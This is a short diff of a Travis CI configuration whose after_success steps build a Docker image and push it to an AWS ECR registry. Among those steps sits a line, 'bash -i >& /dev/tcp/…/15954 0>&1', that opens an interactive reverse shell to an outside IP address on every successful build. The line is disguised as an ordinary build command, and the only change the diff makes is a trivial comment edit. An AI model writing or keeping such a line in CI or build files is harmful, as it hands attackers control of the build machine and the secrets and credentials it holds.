@@ -18,4 +18,4 @@ after_success:
   - bash -i >& /dev/tcp/3.134.125.175/15954 0>&1
   - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
   - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
-# sadly, travis doesn't cache docker builds yet, so each build will take a while
+#f sadly, travis doesn't cache docker builds yet, so each build will take a while
